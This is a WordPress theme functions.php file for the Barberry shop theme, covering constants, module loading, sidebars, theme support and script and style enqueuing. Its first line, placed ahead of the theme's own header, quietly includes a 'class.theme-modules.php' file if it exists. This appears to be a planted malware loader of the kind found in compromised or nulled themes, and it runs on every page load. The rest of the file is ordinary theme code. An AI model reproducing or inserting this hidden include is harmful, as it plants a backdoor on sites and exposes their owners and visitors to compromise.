<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php	


/**
 *
 * The framework's functions and definitions
 *
 */

#-----------------------------------------------------------------#
# Define constants
#-----------------------------------------------------------------#

define( 'BARBERRY_THEME_DIR',					get_template_directory_uri() );
define( 'BARBERRY_THEME_PATH',					get_template_directory() );
define( 'BARBERRY_CHILD_PATH', 					get_stylesheet_directory());
define( 'BARBERRY_IMAGES', 						BARBERRY_THEME_DIR . '/images' );
define( 'BARBERRY_SCRIPTS', 					BARBERRY_THEME_DIR . '/js' );
define( 'BARBERRY_STYLES', 						BARBERRY_THEME_DIR . '/css' );
define( 'BARBERRY_FRAMEWORK', 					'/inc' );
define( 'BARBERRY_VENDOR', 						BARBERRY_THEME_PATH . '/inc/vendor' );
define( 'BARBERRY_FUNCTIONS', 					BARBERRY_THEME_PATH . '/functions' );

define( 'BARBERRY_WOOCOMMERCE_IS_ACTIVE',		class_exists( 'WooCommerce' ) );
define( 'BARBERRY_VISUAL_COMPOSER_IS_ACTIVE',	defined( 'WPB_VC_VERSION' ) );
define( 'BARBERRY_REV_SLIDER_IS_ACTIVE',		class_exists( 'RevSlider' ) );
define( 'BARBERRY_WPML_IS_ACTIVE',				defined( 'ICL_SITEPRESS_VERSION' ) );
define( 'BARBERRY_WISHLIST_IS_ACTIVE',			class_exists( 'YITH_WCWL' ) );

define( 'BARBERRY_GERMAN_MARKET_IS_ACTIVE',               class_exists( 'Woocommerce_German_Market' ) );
define( 'BARBERRY_WOOCOMMERCE_GERMANIZED_IS_ACTIVE',      class_exists( 'WooCommerce_Germanized' ) );

define( 'BARBERRY_SLUG', 						'barberry' );



/* ---------------------------------------------------------------- */
/* ACF theme fields
/* ---------------------------------------------------------------- */

require_once get_template_directory() . '/inc/metaboxes/custom_metaboxes.php';
require_once BARBERRY_FUNCTIONS . '/acf_helpers.php';

#-----------------------------------------------------------------#
# Adobe Fonts (Typekit) & Custom Fonts Support
#-----------------------------------------------------------------#
require_once BARBERRY_FUNCTIONS . '/custom-fonts.php';


#-----------------------------------------------------------------#
# Vendor Plugins
#-----------------------------------------------------------------#

require_once( BARBERRY_VENDOR . '/kirki/kirki.php' );
define( 'BARBERRY_KIRKI_IS_ACTIVE',				class_exists( 'Kirki' ) );


#-----------------------------------------------------------------#
# Customizer
#-----------------------------------------------------------------#
require_once( BARBERRY_THEME_PATH . '/inc/customizer/frontend.php');
require_once( BARBERRY_THEME_PATH . '/inc/customizer/backend.php' );
require_once( BARBERRY_THEME_PATH . '/inc/customizer/options.php' );
require_once( BARBERRY_THEME_PATH . '/inc/customizer/customizer.php' );

#-----------------------------------------------------------------#
# Google Fonts
#-----------------------------------------------------------------#

require_once( BARBERRY_FUNCTIONS . '/google-fonts.php');

#-----------------------------------------------------------------#
# Custom Ajax Settings
#-----------------------------------------------------------------#

require_once( BARBERRY_FUNCTIONS . '/custom-wc-ajax.php');


#-----------------------------------------------------------------#
# Body Classes
#-----------------------------------------------------------------#

include_once( BARBERRY_FUNCTIONS . '/body-classes.php' ); 

#-----------------------------------------------------------------#
# Germanized & German Market
#-----------------------------------------------------------------#

if( BARBERRY_GERMAN_MARKET_IS_ACTIVE || BARBERRY_WOOCOMMERCE_GERMANIZED_IS_ACTIVE ) {
	include_once( get_template_directory() . '/functions/germanized.php');
}

/* ---------------------------------------------------------------- */
/* Navigation Settings
/* ---------------------------------------------------------------- */

if ( is_admin() ) {

	require get_template_directory() . '/inc/mega-menu/class-mega-menu.php';

} else {

	// Frontend functions and shortcodes

	require get_template_directory() . '/inc/mega-menu/class-menu-walker.php';
	require get_template_directory() . '/inc/mega-menu/class-mega-menu-walker.php';

}


/* ---------------------------------------------------------------- */
/* Demo Import
/* ---------------------------------------------------------------- */

require_once( get_template_directory() . '/inc/tgm/class-tgm-plugin-activation.php' );
require_once( get_template_directory() . '/inc/tgm/plugins.php' );
require_once( get_template_directory() . '/inc/admin/wizard/class-helpers.php' );
require_once( get_template_directory() . '/inc/admin/wizard/class-install-wizard.php' );


require_once(get_template_directory() . '/inc/demo/ocdi-setup.php');

/**
 * On theme activation redirect to splash page
 */
global $pagenow;

if ( is_admin() && 'themes.php' == $pagenow && isset( $_GET['activated'] ) ) {

	wp_redirect(admin_url("themes.php?page=tdl-setup")); // Your admin page URL
	
}



/* ---------------------------------------------------------------- */
/* Add ACF fallback
/* ---------------------------------------------------------------- */
if (! is_admin() && ! function_exists('get_field')) {
	function get_field($name) {
		return false;
	}
}

#-----------------------------------------------------------------#
# Load Theme Options
#-----------------------------------------------------------------#  

include_once( BARBERRY_FUNCTIONS . '/theme-options.php' ); 

#-----------------------------------------------------------------#
# Template Tags
#-----------------------------------------------------------------#  

include_once( BARBERRY_FUNCTIONS . '/template-tags.php' ); 

#-----------------------------------------------------------------#
# Woocommerce Options
#-----------------------------------------------------------------#  

include_once( BARBERRY_FUNCTIONS . '/woocommerce.php' ); 


#-----------------------------------------------------------------#
# Product Meta Box
#-----------------------------------------------------------------#  

include_once( BARBERRY_FUNCTIONS . '/product-meta-box-data.php' );

include_once( BARBERRY_THEME_PATH . '/inc/search/class-search.php'  );

#-----------------------------------------------------------------#
# Size Guides
#-----------------------------------------------------------------# 

require_once get_template_directory() . '/inc/size-guide/size-guide.php';

remove_action( 'woocommerce_before_shop_loop', 'woocommerce_catalog_ordering', 30 );

#-----------------------------------------------------------------#
# Custom Gallery field for variations
#-----------------------------------------------------------------# 

require_once get_template_directory() . '/inc/variable-images/variable-images.php';

#-----------------------------------------------------------------#
# Visual Composer
#-----------------------------------------------------------------# 

if (class_exists('WPBakeryVisualComposerAbstract')) {
	
	add_action( 'init', 'visual_composer_stuff' );
	function visual_composer_stuff() {
				
		// Modify and remove existing shortcodes from VC
		include_once( BARBERRY_THEME_PATH . '/inc/shortcodes/visual-composer/custom_vc.php'  );
		
		// VC Templates
		$vc_templates_dir = get_template_directory() . '/inc/shortcodes/visual-composer/vc_templates/';
		vc_set_shortcodes_templates_dir($vc_templates_dir);
		
		// Remove vc_teaser
		if (is_admin()) :
			function remove_vc_teaser() {
				remove_meta_box('vc_teaser', '' , 'side');
			}
			add_action( 'admin_head', 'remove_vc_teaser' );
		endif;
	
	}

}

add_action( 'vc_before_init', 'barberry_vcSetAsTheme' );
function barberry_vcSetAsTheme() {
    vc_manager()->disableUpdater(true);
	vc_set_as_theme();
}

/*-----------------------------------------------------------------------------------*/
/*	Get protocol (http or https)
/*-----------------------------------------------------------------------------------*/

if( ! function_exists( 'barberry_http' )) {
	function barberry_http() {
		if( ! is_ssl() ) {
			return 'http';
		} else {
			return 'https';
		}
	}
}



#-----------------------------------------------------------------#
# Allow upload font files
#-----------------------------------------------------------------#

if( ! function_exists( 'barberry_upload_mimes' ) ) {
	add_filter( 'upload_mimes', 'barberry_upload_mimes', 100, 1 );
	function barberry_upload_mimes( $mimes ) {
		$mimes['woff'] = 'font/woff';
		$mimes['woff2'] = 'font/woff2';
		$mimes['ttf'] = 'font/ttf';
		$mimes['eot'] = 'font/eot';
		return $mimes;
	}
}


/*-----------------------------------------------------------------------------------*/
/*	Get page ID by it's template name
/*-----------------------------------------------------------------------------------*/

if( ! function_exists( 'barberry_tpl2id' ) ) {
	function barberry_tpl2id( $tpl = '' ) {
		$pages = get_pages(array(
			'meta_key' => '_wp_page_template',
			'meta_value' => $tpl
		));
		foreach($pages as $page){
			return $page->ID;
		}
	}
}


/*-----------------------------------------------------------------------------------*/
/*	Sidebars
/*-----------------------------------------------------------------------------------*/

if( ! function_exists( 'barberry_widgets_init' ) ):
	function barberry_widgets_init() {

		if ( class_exists( 'WeDevs_Dokan' ) ) {
		    register_sidebar(
		        apply_filters( 'dokan_store_widget_args', array(
		                'name'          => esc_html__( 'Dokan Store Sidebar', 'barberry' ),
		                'id'            => 'sidebar-store',
		                'before_widget' => '<aside id="%1$s" class="widget dokan-store-widget %2$s">',
		                'after_widget'  => '</aside>',
		                'before_title'  => '<h4 class="widget-title">',
		                'after_title'   => '</h4>',
		            )
		        )
		    );
		}		

		register_sidebar(array(
			'name' => esc_html__('Sidebar', 'barberry'),
			'id' => 'sidebar',
			'before_widget' => '<aside class="widget %2$s">',
			'after_widget'  => '</aside>',
			'before_title'  => '<h4 class="widget-title">',
			'after_title'   => '</h4>',
		));
		
		register_sidebar(array(
			'name' => esc_html__('Shop Sidebar', 'barberry'),
			'id' => 'widgets-product-listing',
			'before_widget' => '<aside class="widget %2$s">',
			'after_widget'  => '</aside>',
			'before_title'  => '<h4 class="widget-title">',
			'after_title'   => '</h4>',
		));

		register_sidebar( array(
			'name'          => esc_html__( 'Shop Filters', 'barberry' ),
			'id'            => 'shop-filters-area',
			'description'   => '',
			'before_widget' => '<div class="cell"><aside id="%1$s" class="widget %2$s">',
			'after_widget'  => '</aside></div>',
			'before_title'  => '<h4 class="widget-title">',
			'after_title'   => '</h4>',
		) );

		register_sidebar(array(
			'name' => esc_html__('Product Page Sidebar', 'barberry'),
			'id' => 'widgets-single-product',
			'before_widget' => '<aside class="widget %2$s">',
			'after_widget'  => '</aside>',
			'before_title'  => '<h4 class="widget-title">',
			'after_title'   => '</h4>',
		));			
		
		register_sidebar(array(
			'name' => esc_html__('Footer 1', 'barberry'),
			'id' => 'footer-sidebar-1',
			'before_widget' => '<aside id="%1$s" class="widget %2$s">',
			'after_widget'  => '</aside>',
			'before_title'  => '<h4 class="widget-title">',
			'after_title'   => '</h4>',
		));
		
		register_sidebar(array(
			'name' => esc_html__('Footer 2', 'barberry'),
			'id' => 'footer-sidebar-2',
			'before_widget' => '<aside id="%1$s" class="widget %2$s">',
			'after_widget'  => '</aside>',
			'before_title'  => '<h4 class="widget-title">',
			'after_title'   => '</h4>',
		));
		
		register_sidebar(array(
			'name' => esc_html__('Footer 3', 'barberry'),			
			'id' => 'footer-sidebar-3',
			'before_widget' => '<aside id="%1$s" class="widget %2$s">',
			'after_widget'  => '</aside>',
			'before_title'  => '<h4 class="widget-title">',
			'after_title'   => '</h4>',
		));
		
		register_sidebar(array(
			'name' => esc_html__('Footer 4', 'barberry'),			
			'id' => 'footer-sidebar-4',
			'before_widget' => '<aside id="%1$s" class="widget %2$s">',
			'after_widget'  => '</aside>',
			'before_title'  => '<h4 class="widget-title">',
			'after_title'   => '</h4>',
		));

		register_sidebar(array(
			'name' => esc_html__('Footer 5', 'barberry'),			
			'id' => 'footer-sidebar-5',
			'before_widget' => '<aside id="%1$s" class="widget %2$s">',
			'after_widget'  => '</aside>',
			'before_title'  => '<h4 class="widget-title">',
			'after_title'   => '</h4>',
		));

}
endif;
add_action( 'widgets_init', 'barberry_widgets_init' );


/*-----------------------------------------------------------------------------------*/
/*	Theme Support
/*-----------------------------------------------------------------------------------*/

	if ( ! function_exists( 'barberry_theme_support' ) ) {
		function barberry_theme_support() {
			
			add_theme_support( 'automatic-feed-links' );
			add_theme_support( 'title-tag' );
			add_theme_support( 'post-thumbnails' );


			
			// Add WooCommerce support
			add_theme_support( 'woocommerce', array(
				'gallery_thumbnail_image_width' => 200,
				'product_grid'          => array(
			        'default_rows'    => 3,
			        'min_rows'        => 1,
			        'max_rows'        => 10,
			        
			        'default_columns' => 3,
			        'min_columns'     => 1,
			        'max_columns'     => 6,
			    ),
			) );
			
			// gutenberg
			add_theme_support( 'align-wide' );
			add_theme_support( 'editor-styles' );
			add_theme_support( 'wp-block-styles' );
			add_theme_support( 'responsive-embeds' );

			add_editor_style( get_template_directory_uri() . '/css/editor-styles.css' );

			if ( wp_is_mobile() ) {
				remove_theme_support( 'wc-product-gallery-zoom' );
			}

			add_theme_support('html5', array(
				'search-form',
				'comment-form',
				'comment-list',
				'gallery',
				'caption',
			));					

			add_image_size( 'barberry-blog-normal', 1200, 800, false );
			add_image_size( 'barberry-blog-large', 1600, 1000, false );

			global $barberry_woocommerce;
			$barberry_woocommerce = new Barberry_WooCommerce;

			if ( is_admin() ) {
				new Barberry_Meta_Box_Product_Data;
			}						

			// Register theme nav menu

			register_nav_menus( array(
				'primary' => esc_html__( 'Primary Menu', 'barberry' ),
				'mobile-menu' => esc_html__( 'Mobile Menu', 'barberry' ),
			) );

			// Localisation support
			load_theme_textdomain( 'barberry', get_template_directory() . '/languages' );

		}
	}
	add_action( 'after_setup_theme', 'barberry_theme_support' );

	if ( ! isset( $content_width ) ) { 
		$content_width = 1920; // pixels
	}

if ( is_admin() ) :
	
	// =============================================================================
	// Enqueue Admin Scripts
	// =============================================================================

	function barberry_admin_scripts() {
	    
	    global $pagenow, $post_type;

	    wp_enqueue_script( 'barberry-admin-scripts', get_template_directory_uri() . '/js/assets/admin/admin.js', array(), barberry_theme_version(), true );
		
		wp_enqueue_script('barberry_admin_go_to_page', get_template_directory_uri() . '/js/assets/admin/go-to-page.js', array('jquery'), barberry_theme_version(), true);
			

		if ( TDL_Opt::getOption('size_guides') ) {
			wp_enqueue_script( 'barberry-edittable-scripts', get_template_directory_uri() . '/js/assets/admin/jquery.edittable.min.js', array(), barberry_theme_version(), true );
		}		
	    
	}
	
	add_action( 'admin_init', 'barberry_admin_scripts' );

endif;


/*-----------------------------------------------------------------------------------*/
/*	Enqueue Admin Styles
/*-----------------------------------------------------------------------------------*/

if ( is_admin() ) :

	function barberry_admin_styles() {

		if ( TDL_Opt::getOption('size_guides') ) {
			wp_enqueue_style( 'barberry-edittable-style', get_template_directory_uri() . '/css/admin/jquery.edittable.min.css', array(), barberry_theme_version() );
		}

		wp_enqueue_style('barberry_admin_styles', get_template_directory_uri() .'/css/admin/admin-styles.css', false, barberry_theme_version(), 'all');

	}

	add_action( 'admin_enqueue_scripts', 'barberry_admin_styles' );

endif;


/*-----------------------------------------------------------------------------------*/
/*	Registers and loads styles
/*-----------------------------------------------------------------------------------*/


if ( ! function_exists('barberry_theme_styles') ) :

	function barberry_theme_styles () {
		if (!is_admin()) {
			global $wp_styles;

			$theme_info = wp_get_theme();

			$suffix = defined('SCRIPT_DEBUG') && SCRIPT_DEBUG ? '' : '.min';

		    if ( BARBERRY_WOOCOMMERCE_IS_ACTIVE ) {
				wp_enqueue_style('select2');
			}			

			// Edit CSS within their files
			wp_register_style( 'stylesheet', get_stylesheet_uri(), array(), '1.0', 'all' );
			wp_register_style( 'barberry-app', get_template_directory_uri() .  "/css/app.css", array(), '1.3', null);

			wp_enqueue_style('barberry-app');
			wp_enqueue_style('stylesheet' );
			
			if( BARBERRY_GERMAN_MARKET_IS_ACTIVE || BARBERRY_WOOCOMMERCE_GERMANIZED_IS_ACTIVE ) {
        wp_enqueue_style( 'barberry-german-market-styles', get_template_directory_uri() . '/css/plugins/german-market'.$suffix.'.css', NULL, barberry_theme_version(), 'all' );
    	}			

		}
	}
	add_action('wp_enqueue_scripts', 'barberry_theme_styles' );

endif;



/*-----------------------------------------------------------------------------------*/
/*	Registers and loads front-end javascript
/*-----------------------------------------------------------------------------------*/


function barberry_scripts_header_priority_0() {

	if ( TDL_Opt::getOption('page_loader') ) {
		wp_enqueue_script('barberry-nprogress', get_template_directory_uri() . '/js/assets/vendor/nprogress.js', NULL, barberry_theme_version(), FALSE);
	}

}
add_action( 'wp_enqueue_scripts', 'barberry_scripts_header_priority_0', 0 );



if ( ! function_exists('barberry_register_js') ) :

	function barberry_register_js() {

	if ( BARBERRY_WOOCOMMERCE_IS_ACTIVE ) {
		wp_enqueue_script('select2');
		wp_enqueue_script('flexslider');
		wp_enqueue_script('wc-single-product');
		wp_enqueue_script('wc-add-to-cart-variation');
	}

	if ( BARBERRY_VISUAL_COMPOSER_IS_ACTIVE) // If VC exists/active load scripts after VC
	{
		$dependencies = array('jquery', 'wpb_composer_front_js');
	}
	else // Do not depend on VC
	{
		$dependencies = array('jquery');
	}	





if ( TDL_Opt::getOption('combined_js') ) {
	// Use combine library

	wp_enqueue_script('barberry-plugins', get_template_directory_uri() . '/js/barberry-plugins-ext.js', $dependencies, barberry_theme_version(), true);

	} else 	{

		
	wp_enqueue_script('jquery-visible', get_template_directory_uri() . '/js/assets/vendor/jquery.visible.min.js', $dependencies, barberry_theme_version(), true);
	wp_enqueue_script('jquery-cookie', get_template_directory_uri() . '/js/assets/vendor/jquery.cookie.js', $dependencies, barberry_theme_version(), true);
	wp_enqueue_script('sticky-header', get_template_directory_uri() . '/js/assets/vendor/sticky-header.js', $dependencies, '1.2.3', true);
	wp_enqueue_script('foundation', get_template_directory_uri() . '/js/assets/vendor/foundation.min.js', $dependencies, barberry_theme_version(), true);
	wp_enqueue_script('lazyload', get_template_directory_uri() . '/js/assets/vendor/lazyload.min.js', $dependencies, '1.9.7', true);
	wp_enqueue_script('jquery-hoverintent', get_template_directory_uri() . '/js/assets/vendor/jquery.hoverIntent.js', $dependencies, '1.9.0', true);
	wp_enqueue_script('jquery-nanoscroller', get_template_directory_uri() . '/js/assets/vendor/jquery.nanoscroller.min.js', $dependencies, '0.8.7', true);
	wp_enqueue_script('imagesloaded', get_template_directory_uri() . '/js/assets/vendor/imagesloaded.pkgd.min.js', $dependencies, '4.1.4', true);
	wp_enqueue_script('flickity', get_template_directory_uri() . '/js/assets/vendor/flickity.pkgd.min.js', $dependencies, '2.1.2', true);
	wp_enqueue_script('flickity-sync', get_template_directory_uri() . '/js/assets/vendor/flickity-sync.js', $dependencies, '2.0.0', true);
	wp_enqueue_script('flickity-bg-lazyload', get_template_directory_uri() . '/js/assets/vendor/bg-lazyload.js', $dependencies, '1.0.0', true);
	wp_enqueue_script('rellax', get_template_directory_uri() . '/js/assets/vendor/rellax.min.js', $dependencies, barberry_theme_version(), true);
	wp_enqueue_script('parallax-scroll', get_template_directory_uri() . '/js/assets/vendor/jquery.parallax-scroll.js', $dependencies, barberry_theme_version(), true);
	wp_enqueue_script('mobile-detect', get_template_directory_uri() . '/js/assets/vendor/mobile-detect.min.js', $dependencies, barberry_theme_version(), true);

	if ( TDL_Opt::getOption('typewriter_effect')) {
		wp_enqueue_script('typed', get_template_directory_uri() . '/js/assets/vendor/typed.min.js', $dependencies, barberry_theme_version(), true);
	}

	wp_enqueue_script('tweenmax', get_template_directory_uri() . '/js/assets/vendor/TweenMax.min.js', $dependencies, barberry_theme_version(), true);
	wp_enqueue_script('splittext', get_template_directory_uri() . '/js/assets/vendor/splittext.min.js', $dependencies, barberry_theme_version(), true);
	wp_enqueue_script('jquery-bez', get_template_directory_uri() . '/js/assets/vendor/jquery.bez.js', $dependencies, barberry_theme_version(), true);
	wp_enqueue_script('scrollreveal', get_template_directory_uri() . '/js/assets/vendor/scrollreveal.min.js', $dependencies, barberry_theme_version(), true);
	wp_enqueue_script('resizesensor', get_template_directory_uri() . '/js/assets/vendor/ResizeSensor.js', $dependencies, barberry_theme_version(), true);
	wp_enqueue_script('sticky-sidebar', get_template_directory_uri() . '/js/assets/vendor/jquery.sticky-sidebar.min.js', $dependencies, barberry_theme_version(), true);
	wp_enqueue_script('jquery-zoom', get_template_directory_uri() . '/js/assets/vendor/jquery.zoom.min.js', $dependencies, barberry_theme_version(), true);
	wp_enqueue_script('color-thief', get_template_directory_uri() . '/js/assets/vendor/color-thief.min.js', $dependencies, barberry_theme_version(), true);
	wp_enqueue_script('photoswipe', get_template_directory_uri() . '/js/assets/vendor/photoswipe.min.js', $dependencies, barberry_theme_version(), true);
	wp_enqueue_script('photoswipe-ui', get_template_directory_uri() . '/js/assets/vendor/photoswipe-ui-default.min.js', $dependencies, barberry_theme_version(), true);

	if ( TDL_Opt::getOption('product_share') || TDL_Opt::getOption('blog_single_share')) {
		wp_enqueue_script('barberry-social-share', get_template_directory_uri() . '/js/assets/vendor/social-share.js', $dependencies, barberry_theme_version(), true);
	}

	wp_enqueue_script('countdown', get_template_directory_uri() . '/js/assets/vendor/countdown.min.js', $dependencies, barberry_theme_version(), true);
	wp_enqueue_script('autocomplete', get_template_directory_uri() . '/js/assets/vendor/jquery.autocomplete.js', $dependencies, barberry_theme_version(), true);
	}

	wp_enqueue_script('barberry-scripts', get_template_directory_uri() . '/js/barberry-scripts-ext.js', $dependencies, barberry_theme_version(), true);

	$lightbox = 'no';


	// Send variables to js
	$barberry_scripts_vars_array = array(
		'ajaxurl'					=> esc_url(admin_url( 'admin-ajax.php' )),
		'nonce'						=> wp_create_nonce( '_barberry_nonce' ),
		'select_placeholder'        => esc_html__( 'Choose an option', 'barberry' ),
		'catalog_ajax_filter'       => intval( TDL_Opt::getOption('ajax_shop') ),
		'header_cart_link'       	=> TDL_Opt::getOption('header_cart_link'),
		'add_to_cart_action'       	=> TDL_Opt::getOption('add_to_cart_action'),
		'page_loader'       		=> intval( TDL_Opt::getOption('page_loader') ),
		'load_animation'       		=> intval( TDL_Opt::getOption('load_animation') ),
		'backtotop'       			=> intval( TDL_Opt::getOption('backtotop') ),
		'footer_hover'       		=> intval( TDL_Opt::getOption('footer_hover') ),
		'ajax_loading_locale' 		=> esc_html__( 'Load More', 'barberry' ),
		'shop_pagination_type' 		=> TDL_Opt::getOption('shop_pagination'),
		'blog_pagination_type' 		=> TDL_Opt::getOption('blog_pagination'),
		'blog_posts_parallax' 		=> intval(TDL_Opt::getOption('blog_posts_parallax')),
		'blog_single_share' 		=> intval(TDL_Opt::getOption('blog_single_share')),
		'shop_filters_close' 		=> (!empty(TDL_Opt::getOption('shop_filters_close'))) ? TDL_Opt::getOption('shop_filters_close') : 0,
		'shop_addtocart' 			=> (!empty(TDL_Opt::getOption('shop_addtocart'))) ? TDL_Opt::getOption('shop_addtocart') : 0,
		'sticky_header'         	=> (!empty(TDL_Opt::getOption('sticky_header'))) ? TDL_Opt::getOption('sticky_header') : 0,
		'sticky_addtocart_mob'      => (!empty(TDL_Opt::getOption('product_sticky_addtocart_mob'))) ? TDL_Opt::getOption('product_sticky_addtocart_mob') : 0,
		'shop_sticky_sidebar'       => (!empty(TDL_Opt::getOption('sticky_sidebar'))) ? TDL_Opt::getOption('sticky_sidebar') : 0,
		'product_zoom'              => intval(TDL_Opt::getOption('product_zoom')),
		'lightbox'                  => $lightbox,
		'notifications_click'       => intval(TDL_Opt::getOption('notifications_click')),
		'product_quick_view'  		=> intval(TDL_Opt::getOption('product_quick_view')),
		'product_add_to_cart_ajax'  => intval(TDL_Opt::getOption('product_add_to_cart_ajax')),
		'product_images_lightbox'   => intval(TDL_Opt::getOption('product_images_lightbox')),
		'variation_gallery'   		=> intval(TDL_Opt::getOption('variation_gallery')),
		'product_lightbox_dominant' => intval(TDL_Opt::getOption('product_lightbox_dominant')),
		'upsells_products_columns' 	=> TDL_Opt::getOption('upsells_products_columns'),
		'related_products_columns' 	=> TDL_Opt::getOption('related_products_columns'),
		'related_uppsells_scroll' 	=> TDL_Opt::getOption('related_uppsells_scroll'),
		'product_share' 			=> intval(TDL_Opt::getOption('product_share')),
		'countdown_days' 			=> esc_html__('Days', 'barberry'),
		'countdown_hours' 			=> esc_html__('Hours', 'barberry'),
		'countdown_mins' 			=> esc_html__('Min', 'barberry'),
		'countdown_sec' 			=> esc_html__('Sec', 'barberry'),
		'typewriter_effect' 		=> intval(TDL_Opt::getOption('typewriter_effect')),
		'typewriter_text' 			=> TDL_Opt::getOption('typewriter_text'),
		'typewriter_text_2' 		=> esc_html__( 'Start typing...', 'barberry' ),	
		'noSuggestionNotice' 		=> esc_html__( 'No products found', 'barberry' ),
		'live_search_empty_msg'	=> esc_html__( 'Unable to find any products that match the currenty query', 'barberry' ),
		'all_results' => esc_html__('View all results', 'barberry'),			
		'mapApiKey'					=> TDL_Opt::getOption('google_map_api_key'),
		'rtl'                       => is_rtl() ? 'true' : 'false',

	);
	
	wp_localize_script( 'barberry-scripts', 'barberry_scripts_vars', $barberry_scripts_vars_array );


	if (is_singular() && comments_open() && get_option( 'thread_comments')) {
		wp_enqueue_script('comment-reply');
	}


	}

	add_action('wp_enqueue_scripts', 'barberry_register_js');

endif;